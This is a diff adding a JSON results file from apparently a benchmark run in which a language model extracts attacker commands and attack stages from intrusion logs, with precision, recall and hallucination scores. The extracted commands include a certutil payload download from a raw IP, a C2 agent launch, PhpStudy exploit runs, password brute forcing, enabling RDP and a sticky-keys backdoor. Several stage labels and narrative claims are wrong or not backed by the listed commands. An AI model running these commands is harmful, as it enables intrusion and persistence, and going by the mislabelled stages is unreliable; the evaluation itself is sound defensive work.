@@ -1,0 +1,103 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "taskkill /f /im agent.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\\\Users\\\\Public\\\\agent.exe",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd /c start /min C:\\\\Users\\\\Public\\\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.224.85.207:8443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "python PhpStudyPoc.py http://121.36.30.176/",
+        "stage": "Collection"
+      },
+      {
+        "command": "del /f /q PhpStudyPoc.py",
+        "stage": "Collection"
+      },
+      {
+        "command": "python PhpStudyExp2.py http://121.36.30.176/ \"whoami&arp -a&ipconfig&ping www.baidu.com -c 1\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "del /f /q PhpStudyExp2.py",
+        "stage": "Collection"
+      },
+      {
+        "command": "taskkill /f /im agent.exe&certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\\\Users\\\\Public\\\\agent.exe&cmd /c start /min C:\\\\Users\\\\Public\\\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.224.85.207:8443",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "WinBrute.exe administrator_pass.txt administrator",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "Reg ADD HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Terminal Server \\/v fDenyTSConnections /t REG_DWORD /d 0 /f",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "\\192.168.0.95 -u administrator -p Data123456! ipconfig",
+        "stage": "Discovery"
+      },
+      {
+        "command": "del /f /q WinBrute.exe && del /f /q administrator_pass.txt",
+        "stage": "Persistence"
+      },
+      {
+        "command": "Reg ADD HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\sethc.exe /v Debugger /t REG_SZ /d C:\\\\windows\\\\system32\\\\cmd.exe /f",
+        "stage": "Persistence"
+      }
+    ],
+    "narrative": "The attacker gained initial access through an unknown vector. The attacker created a backdoor using Agent.exe and established a command and control channel. The attacker proceeded to gather information about the host and network environment through PHP Study POC and Exp2 tools. The attacker attempted to escalate privileges by enabling Remote Desktop and modifying Windows Defender settings. The attacker accessed sensitive information using a brute-forcing tool called WinBrute. The attacker also moved laterally between hosts using PAExec. Finally, the attacker persisted their presence by deleting logs and configuration files.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 8385,
+      "completion_tokens": 689,
+      "total_tokens": 9074,
+      "wall_clock_s": 8.749,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.46153846153846156,
+      "recall": 0.75,
+      "f1": 0.5714285714285714,
+      "tp": 6,
+      "fp": 7,
+      "fn": 2
+    },
+    "stage": {
+      "precision": 0.15384615384615385,
+      "recall": 0.3333333333333333,
+      "f1": 0.21052631578947367,
+      "tp": 2,
+      "fp": 11,
+      "fn": 4,
+      "recall_partial": 0.5
+    },
+    "hallucination_rate": 0.14285714285714285,
+    "cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 8385,
+      "completion_tokens": 689,
+      "total_tokens": 9074,
+      "wall_clock_s": 8.749,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v4_triage",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true
+  }
+}
